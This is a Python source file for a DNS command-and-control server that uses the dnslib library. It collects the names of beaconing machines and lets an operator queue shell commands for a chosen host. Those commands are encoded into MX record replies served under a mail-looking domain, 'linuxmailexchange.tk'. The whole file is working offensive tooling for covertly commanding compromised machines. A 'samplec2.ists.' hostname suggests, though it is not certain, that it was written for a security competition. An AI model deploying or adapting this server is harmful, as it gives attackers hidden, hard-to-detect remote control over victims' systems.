"""
Due to how DNS works, it allows for much more robust beaconing, but there's tradeoffs
Requirements:
    Python 3
    dnslib module (pip install dnslib)
"""

from dnslib import *
from dnslib.server import *
from time import sleep

def perChar(letter):
    if ord(letter) - 32 < 10:
        return "0" + str(ord(letter)-32)
    else:
        return str(ord(letter)-32)

def encodeCmd(cmd):
    output = ""
    for ch in cmd:
        output += perChar(ch)
    return output

class MemeResolver:
    knownHosts = []
    waitingCommands = dict()
    c2IP = "samplec2.ists."
    c2enabled = True

    def resolve(self,request,handler):
        reply = request.reply()
        qname = request.get_q().get_qname()
        print("Qname:", str(qname))
        #print(request.get_q().qtype)  # 1: A, 28: AAAA, 15: MX, 5: CNAME

        if qname == "c2.":
            reply.add_answer(*RR.fromZone("c2.linuxmailexchange.tk. 60 IN MX 10 "+self.c2IP))
        if qname == "c2e.":
            if self.c2enabled:
                reply.add_answer(*RR.fromZone("c2e.a.linuxmailexchange.tk. 60 IN MX 10 yes."))
            else:
                reply.add_answer(*RR.fromZone("c2e.a.linuxmailexchange.tk. 60 IN MX 10 no."))

        if qname in self.waitingCommands:
            response = encodeCmd(self.waitingCommands[qname])
            reply.add_answer(*RR.fromZone(str(qname) + " 60 IN MX 10 "+response+"."))
            self.waitingCommands.pop(qname, None)
        else:
            reply.header.rcode = getattr(RCODE, 'NXDOMAIN')
            if not qname in self.knownHosts:
                self.knownHosts.append(qname)
        print(reply)
        return reply

    def disableC2(self):
        self.c2enabled = False

    def setC2(self, ip):
        self.c2IP = ip

def machineList(machines):
    if len(machines) == 0:
        print("No known machines.")
        return
    for i in range(len(machines)):
        print(i, ":  ",machines[i])

def main():
    resolver = MemeResolver()
    server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
    server.start_thread()
    print("Server launched.")
    print("Commands:")
    print("         l - List known machines")
    print("         c # - Set command for machine #")
    try:
        while 1:
            cmd = input("mailman# ")
            if cmd == "" or cmd == None:
                continue
            if cmd == "l":
                machineList(resolver.knownHosts)
            elif cmd[0] == "c":
                target = int(cmd.split(" ")[1])
                targetCmd = input("Target$ ")
                resolver.waitingCommands[resolver.knownHosts[target]] = targetCmd
            else:
                print("Unknown command.")
    except KeyboardInterrupt:
        pass
    finally:
        server.stop()

if __name__ == "__main__":
    main()